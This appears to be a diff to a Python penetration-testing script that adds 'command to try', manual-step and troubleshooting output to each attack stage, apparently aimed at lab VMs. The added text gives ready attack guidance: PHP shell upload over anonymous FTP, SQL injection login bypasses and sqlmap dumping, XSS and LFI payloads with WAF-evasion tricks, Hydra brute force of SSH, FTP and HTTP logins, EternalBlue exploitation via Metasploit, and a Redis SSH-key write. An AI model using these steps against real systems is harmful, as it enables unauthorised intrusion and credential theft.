@@ -131,6 +131,82 @@ def found(msg):  print(f"  {C.GREEN}[+]{C.RESET} {msg}")
 def warn(msg):   print(f"  {C.RED}[-]{C.RESET} {msg}")
 def tip(msg):    print(f"  {C.MAGENTA}[💡]{C.RESET} {msg}")
 
+
+def manual_steps(title, steps):
+    """Print a 'How to do it manually' section. steps = list of strings."""
+    print(f"\n  {C.CYAN}{C.BOLD}📋 {title}{C.RESET}")
+    for i, s in enumerate(steps, 1):
+        print(f"  {C.BLUE}  {i}. {s}{C.RESET}")
+    print()
+
+
+def troubleshoot(problems):
+    """Print a 'Having problems?' section. problems = list of (symptom, solution) tuples."""
+    print(f"\n  {C.YELLOW}{C.BOLD}🔧 Having problems?{C.RESET}")
+    for symptom, solution in problems:
+        print(f"  {C.RED}  • {symptom}{C.RESET}")
+        print(f"  {C.GREEN}    → {solution}{C.RESET}")
+    print()
+
+
+# ─────────────────────────────────────────────────────────
+#  SECLISTS / WORDLIST DIRECTORY
+# ─────────────────────────────────────────────────────────
+# Path to SecLists-style wordlist directory (common on Linux pentest VMs)
+SECLISTS_DIR = "/usr/share/wordlist/Seclist"
+# Fallback if installed as 'wordlists' and 'SecLists'
+SECLISTS_DIR_FALLBACK = "/usr/share/wordlists/SecLists"
+
+
+def read_seclist_directory(dir_path=None, recursive=False, max_depth=2):
+    """
+    Read contents of the SecLists/wordlist directory.
+    Returns list of dicts: [{"name": "...", "path": "...", "is_dir": bool}, ...]
+    If directory does not exist, tries SECLISTS_DIR_FALLBACK, then returns [].
+    """
+    path = dir_path or SECLISTS_DIR
+    if not os.path.isdir(path):
+        path = SECLISTS_DIR_FALLBACK
+    if not os.path.isdir(path):
+        return []
+
+    result = []
+    try:
+        for name in sorted(os.listdir(path)):
+            full = os.path.join(path, name)
+            is_dir = os.path.isdir(full)
+            result.append({"name": name, "path": full, "is_dir": is_dir})
+            if recursive and is_dir and max_depth > 0:
+                for sub in read_seclist_directory(full, recursive=True, max_depth=max_depth - 1):
+                    result.append({**sub, "path": os.path.join(full, sub["name"])})
+    except (OSError, PermissionError):
+        pass
+    return result
+
+
+def get_seclist_wordlist_files(dir_path=None, extensions=None):
+    """
+    Return list of wordlist file paths under SECLISTS_DIR (non-recursive for top-level,
+    or pass dir_path to a subdir). Optional filter by extensions, e.g. ('.txt',).
+    """
+    if extensions is None:
+        extensions = (".txt", ".lst", "")
+    path = dir_path or SECLISTS_DIR
+    if not os.path.isdir(path):
+        path = SECLISTS_DIR_FALLBACK
+    if not os.path.isdir(path):
+        return []
+
+    files = []
+    try:
+        for name in sorted(os.listdir(path)):
+            full = os.path.join(path, name)
+            if os.path.isfile(full) and (not extensions or any(name.endswith(ext) for ext in extensions)):
+                files.append(full)
+    except (OSError, PermissionError):
+        pass
+    return files
+
 # ─────────────────────────────────────────────────────────
 #  STEP 1: HOST DISCOVERY + OS FINGERPRINTING
 # ─────────────────────────────────────────────────────────
@@ -345,6 +421,22 @@ def check_ftp(target, open_ports):
     except Exception as e:
         warn(f"FTP check failed: {e}")
 
+    # Command → Manual steps → Troubleshooting
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  ftp {target}")
+    manual_steps("How to do it manually (FTP anonymous)", [
+        f"Open a terminal and run:  ftp {target}",
+        "When prompted for Name: type  anonymous  (or leave blank)",
+        "When prompted for Password: press Enter (or type anything)",
+        "At ftp> prompt:  ls -la   to list files",
+        "Download a file:  get filename.txt   (use  mget *  for all)",
+        "If directory is writable:  put shell.php   then visit http://" + target + "/shell.php in browser",
+    ])
+    troubleshoot([
+        ("Connection refused or timed out", "VM may be off or port 21 closed. Run: nmap -p 21 " + target + "  and ensure VM is on same network (e.g. NAT)."),
+        ("Login incorrect / 530 Login authentication failed", "This host does not allow anonymous FTP. Try FTP brute force (Step 10) or skip."),
+        ("ftp: command not found", "On Windows use a client (FileZilla, WinSCP) or enable FTP in Windows Features. On Linux: sudo apt install ftp."),
+    ])
+
 
 # ─────────────────────────────────────────────────────────
 #  STEP 5: WEB ENUMERATION + CMS DETECTION + HEADERS
@@ -476,6 +568,22 @@ def web_enumeration(target, open_ports):
                 except:
                     pass
 
+    # Command → Manual steps → Troubleshooting (Web)
+    base_ex = f"http://{target}" if 80 in open_ports else f"http://{target}:{next((p for p in web_ports), 80)}"
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  gobuster dir -u {base_ex} -w /usr/share/wordlists/dirb/common.txt")
+    manual_steps("How to do it manually (Web directories)", [
+        f"Install gobuster if needed:  sudo apt install gobuster",
+        f"Run:  gobuster dir -u {base_ex} -w /usr/share/wordlists/dirb/common.txt -t 30",
+        "Open each found path in your browser (e.g. " + base_ex + "/admin)",
+        "Check robots.txt in browser: " + base_ex + "/robots.txt",
+        "If WordPress: run  wpscan --url " + base_ex + " -e ap,u",
+    ])
+    troubleshoot([
+        ("No paths found / empty wordlist", "Use a bigger wordlist: /usr/share/wordlists/dirbuster/ or SecLists Discovery/Web-Content."),
+        ("Connection refused / timeout", "Target may block you or be down. Check: ping " + target + "  and  curl -I " + base_ex),
+        ("gobuster: command not found", "Install: sudo apt install gobuster  (Kali) or download from GitHub."),
+    ])
+
 
 # ─────────────────────────────────────────────────────────
 #  STEP 6: SQL INJECTION DETECTION
@@ -580,6 +688,21 @@ def sqli_check(target, open_ports):
         info("No obvious SQLi found on common login pages (try sqlmap for deeper scan)")
     tip(f"Run: sqlmap -u 'http://{target}/login.php' --data='username=a&password=b' --level=3")
 
+    # Command → Manual steps → Troubleshooting (SQLi)
+    base_sqli = f"http://{target}"
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  sqlmap -u '{base_sqli}/login.php' --data='username=a&password=b' --dbs")
+    manual_steps("How to do it manually (SQL injection)", [
+        f"In browser, open login page. In username try:  admin'--   (leave password empty). If you get in = SQLi.",
+        f"Or try:  ' OR '1'='1   in both fields to bypass login.",
+        f"Automated:  sqlmap -u '{base_sqli}/login.php' --data='username=a&password=b' --dbs --batch",
+        "Then dump a database:  sqlmap ... -D database_name --tables  and  --dump",
+    ])
+    troubleshoot([
+        ("sqlmap: no parameter found", "Specify the exact POST data. Capture the form with Burp and use --data='user=1&pass=1' with real parameter names."),
+        ("WAF blocking / 403", "Use --tamper=space2comment or --random-agent. Try a different injection point (e.g. search box)."),
+        ("No SQLi but login is weak", "Focus on HTTP brute force (Step 11) or default credentials."),
+    ])
+
 
 # ─────────────────────────────────────────────────────────
 #  STEP 7: XSS DETECTION
@@ -651,6 +774,21 @@ def xss_check(target, open_ports):
     if not REPORT["xss_found"]:
         info("No reflected XSS found in common parameters")
     tip("Test manually: add ?search=<script>alert(1)</script> to URLs in your browser")
+
+    # Command → Manual steps → Troubleshooting (XSS)
+    base_xss = f"http://{target}"
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  Add to URL:  ?q=<script>alert(1)</script>   or use XSStrike/Burp")
+    manual_steps("How to do it manually (XSS)", [
+        f"Find a search or input that echoes back (e.g. {base_xss}/search?q=test).",
+        "Replace test with:  <script>alert(1)</script>  — if a popup appears, XSS is confirmed.",
+        "Try in different places: search box, comment form, URL parameters.",
+        "For stored XSS: submit the payload; then view the page as another user — script runs in their browser.",
+    ])
+    troubleshoot([
+        ("No popup / payload is encoded", "Site may be escaping output. Try polyglot: javascript:alert(1) or <img src=x onerror=alert(1)>."),
+        ("Only works in one browser", "Check Content-Type and encoding. Try Burp to see raw response."),
+        ("WAF blocks <script>", "Use encoding or alternate tags: <svg onload=alert(1)> or <body onload=alert(1)>."),
+    ])
 
 
 # ─────────────────────────────────────────────────────────
@@ -725,6 +863,21 @@ def lfi_check(target, open_ports):
         info("No LFI found in common parameters")
     tip(f"Try manually: http://{target}/page.php?file=../../../../etc/passwd")
 
+    # Command → Manual steps → Troubleshooting (LFI)
+    base_lfi = f"http://{target}"
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  {base_lfi}/index.php?file=../../../../etc/passwd")
+    manual_steps("How to do it manually (LFI)", [
+        f"Find a URL with a file/page parameter, e.g.  {base_lfi}/page.php?file=about.php",
+        "Change to:  ?file=../../../../etc/passwd  — if you see root:x:0:0, LFI works.",
+        "Try reading web config:  ?file=../../../../var/www/html/config.php  or  php://filter/convert.base64-encode/resource=index.php",
+        "If you get base64 output, decode it to see PHP source (and DB passwords).",
+    ])
+    troubleshoot([
+        ("Blank page or 404", "Parameter name may differ (page, include, path, doc). Enumerate with ffuf or try common names."),
+        ("Filtered / WAF", "Try double encoding (..%252f), null byte (....//etc/passwd%00), or /proc/self/environ."),
+        ("PHP filter returns nothing", "Path might be wrong. Try resource=config.php or other files you know exist on the server."),
+    ])
+
 
 # ─────────────────────────────────────────────────────────
 #  STEP 9: SSH BRUTE FORCE
@@ -793,6 +946,20 @@ def ssh_brute(target, open_ports):
         warn("No default SSH credentials worked")
         tip(f"Try: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}")
 
+    # Command → Manual steps → Troubleshooting (SSH)
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  ssh root@{target}   (then try passwords: root, toor, password)")
+    manual_steps("How to do it manually (SSH login)", [
+        f"Open terminal. Run:  ssh root@{target}",
+        "When prompted for password, try:  root, toor, password, admin, 123456",
+        "For brute force with wordlist:  hydra -L users.txt -P rockyou.txt ssh://" + target,
+        "After login run:  id  and  sudo -l  to see your privileges",
+    ])
+    troubleshoot([
+        ("Permission denied (publickey) or Connection refused", "Target only allows key auth or SSH is filtered. Try the username/password the tool found, or use Hydra with -t 4."),
+        ("Hydra: wordlist not found", "Kali: rockyou at /usr/share/wordlists/rockyou.txt (gunzip first). Users: /usr/share/wordlists/metasploit/unix_users.txt."),
+        ("Too many authentication failures", "SSH limits tries. Use Hydra with -t 1 or try manually with one password at a time."),
+    ])
+
 
 # ─────────────────────────────────────────────────────────
 #  STEP 10: FTP BRUTE FORCE
@@ -835,6 +1002,18 @@ def ftp_brute(target, open_ports):
             pass
         except:
             break
+
+    # Command → Manual steps → Troubleshooting (FTP brute)
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  hydra -L users.txt -P rockyou.txt ftp://{target}")
+    manual_steps("How to do it manually (FTP brute force)", [
+        f"Create small user list (e.g. root, admin, ftp) and pass list (admin, password, 123456).",
+        f"Run:  hydra -L users.txt -P pass.txt ftp://{target}",
+        f"Or try interactively:  ftp {target}  then login with combinations the tool suggested.",
+    ])
+    troubleshoot([
+        ("FTP connection timed out", "Port 21 may be closed or filtered. Confirm with: nmap -p 21 " + target),
+        ("All logins fail", "Target may use non-default accounts. Use a larger user list (e.g. SecLists Usernames) and rockyou.txt."),
+    ])
 
 
 # ─────────────────────────────────────────────────────────
@@ -911,6 +1090,21 @@ def http_brute(target, open_ports):
             except:
                 pass
 
+    # Command → Manual steps → Troubleshooting (HTTP login)
+    base_http = f"http://{target}" if 80 in open_ports else f"http://{target}:{next((p for p in web_ports), 80)}"
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  hydra -L users.txt -P pass.txt {base_http}/login.php http-post-form \"username=^USER^&password=^PASS^:Invalid\"")
+    manual_steps("How to do it manually (HTTP login brute)", [
+        f"Open the login page in browser: {base_http}/login.php  (or /wp-login.php for WordPress)",
+        "Try by hand: admin/admin, admin/password, root/root. Watch for redirect or 'Welcome'.",
+        "For Hydra: identify the exact form field names (F12 → Inspect) and the failure message (e.g. 'Invalid').",
+        f"Run: hydra -l admin -P rockyou.txt {base_http}/login.php http-post-form \"user=^USER^&pass=^PASS^:Invalid\" -t 4",
+    ])
+    troubleshoot([
+        ("No login page found", "Enumerate directories first (Step 5). Try /login, /admin, /wp-login.php, /user/login."),
+        ("Hydra says Invalid form / 401", "Field names or URL may differ. Use Burp to capture the exact POST request and copy parameters."),
+        ("Account locked / too many attempts", "VM may have lockout. Wait a few minutes or try from another IP; use -t 1 in Hydra to slow down."),
+    ])
+
 
 # ─────────────────────────────────────────────────────────
 #  STEP 12: SMB ENUMERATION
@@ -972,6 +1166,20 @@ def smb_check(target, open_ports):
     tip(f"nmap --script smb-vuln-ms17-010,smb-enum-shares -p 445 {target}")
     tip(f"smbclient -L //{target}/ -N")
     tip(f"enum4linux -a {target}")
+
+    # Command → Manual steps → Troubleshooting (SMB)
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Commands to try:{C.RESET}  smbclient -L //{target}/ -N   then  nmap --script smb-vuln-ms17-010 -p 445 {target}")
+    manual_steps("How to do it manually (SMB)", [
+        f"List shares (no password):  smbclient -L //{target}/ -N",
+        f"Connect to a share:  smbclient //{target}/sharename -N   then  ls, get <file>",
+        f"Full enum:  enum4linux -a {target}   (users, groups, shares)",
+        f"Check EternalBlue:  nmap --script smb-vuln-ms17-010 -p 445 {target}  — if VULNERABLE, use Metasploit ms17_010_eternalblue",
+    ])
+    troubleshoot([
+        ("Connection refused / NT_STATUS_ACCESS_DENIED", "Port 445 may be closed or host blocks SMB. Run: nmap -p 139,445 " + target),
+        ("smbclient/enum4linux not found", "Install: sudo apt install smbclient enum4linux  (Kali has them by default)."),
+        ("EternalBlue not found but port open", "Target may be patched. Try null session and weak credentials (smbclient with -U user%pass)."),
+    ])
 
 
 # ─────────────────────────────────────────────────────────
@@ -1041,6 +1249,19 @@ def check_other_services(target, open_ports):
                  f"mongo {target}:27017   then: show dbs, use admin, show collections, db.users.find()")
         tip(f"mongo {target}:27017")
         tip("show dbs → use admin → db.users.find()")
+
+    # Command → Manual steps → Troubleshooting (default creds)
+    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Commands to try:{C.RESET}  mysql -h {target} -u root   |   redis-cli -h {target}   |   mongo {target}:27017")
+    manual_steps("How to do it manually (MySQL / Redis / MongoDB)", [
+        f"MySQL:  mysql -h {target} -u root -p   (try empty password or root, toor). Then: SHOW DATABASES; USE mysql; SELECT * FROM user;",
+        f"Redis:  redis-cli -h {target}   then  INFO, KEYS *. If no auth, try writing SSH key (search 'redis ssh key write').",
+        f"Mongo:  mongo {target}:27017   then  show dbs, use admin, show collections, db.users.find()",
+    ])
+    troubleshoot([
+        ("mysql: connection refused", "Port 3306 may be closed or MySQL binds to localhost only. Check: nmap -p 3306 " + target),
+        ("Redis PING works but no write", "Redis may be read-only or protected. Try INFO server and CONFIG GET dir to see if you can change paths."),
+        ("Mongo auth required", "Some VMs enable auth. Try default credentials or skip; focus on other services."),
+    ])
 
 
 # ─────────────────────────────────────────────────────────
